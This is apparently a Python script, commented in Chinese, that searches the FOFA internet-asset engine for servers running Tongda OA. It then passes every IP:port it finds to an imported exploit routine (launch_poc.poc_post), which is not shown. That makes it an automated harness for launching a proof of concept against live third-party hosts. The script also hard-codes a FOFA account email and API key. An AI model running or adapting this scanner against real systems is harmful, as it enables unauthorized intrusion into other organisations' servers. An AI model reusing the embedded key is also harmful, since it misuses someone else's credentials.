import requests
import json
import base64
import launch_poc
import sys

# 将字符串转换为Base64编码
def encode_to_base64(input_string):
    # 使用base64模块的b64encode函数进行编码
    encoded_bytes = base64.b64encode(input_string.encode('utf-8'))
    print(input_string.encode('utf-8'))
    print(list(encoded_bytes))
    #字节序列的显示方式取决于所使用的Python解释器以及终端的配置。在大多数情况下，print函数会将字节序列（bytes）按照ASCII编码或UTF - 8编码转换为相应的字符，并在终端中以字符形式显示。这是因为终端通常会自动将字节数据转换为适当的字符显示。
    # 将编码后的字节转换为字符串(虽然print会自动转但是……)并移除input_string中可能的换行符
    encoded_string = encoded_bytes.decode('utf-8').replace('\n', '')
    print(list(encoded_string))
    print(encoded_string)
    return encoded_string

def do_request(query):
    # 使用新函数将查询字符串转换为Base64编码
    qbase64 = encode_to_base64(query)

    # 设置要发送的数据
    data = {
        'email': '809121932@qq.com',
        'key': 'c5a247b4fd0ea2b2dbe3c2645a0abbc4',
        # 'email': 'ktg28510@yuoia.com',
        # 'key': 'f9b210e718952e5a295d7f8319431cba',
        'qbase64': qbase64, #'YXBwPSJURFhLLemAmui+vk9BIg==',
    }

    # 设置目标URL
    url = 'https://fofa.info/api/v1/search/all'  # 替换成您要发送请求的实际URL

    # 发送POST请求
    response = requests.post(url, data=data)

    # 检查响应状态码
    if response.status_code == 200:
        print('200-请求成功！')
        # 解析JSON响应内容
        response_data = json.loads(response.text)
        error_value = response_data["error"]
        print(error_value)
        if error_value == 'True':
            #error默认是false
            decoded_text = bytes(response.text, 'utf-8').decode('unicode_escape')
            print(decoded_text)
            print("--------------------------------------------------------------test")
            # 在这个条件下终止程序并返回退出代码 1（通常表示失败）
            sys.exit(1)
        else:
            # 使用json.dumps()将其格式化为可读性更高的字符串
            formatted_response = json.dumps(response_data, indent=4)
            print('响应内容：')
            print(formatted_response)
            # 提取响应results中的ip:端口项并调用poc.py，使用enumerate函数获取索引并输出
            for index, result in enumerate(response_data["results"], start=1):
                ip_port = result[0]
                print(f"开始测试第 {index} 个结果: {ip_port}")
                launch_poc.poc_post(ip_port)

    else:
        print('请求失败，状态码：', response.status_code)

if __name__ == '__main__':
    query = 'app="TDXK-通达OA"'# 查询语句
    do_request(query)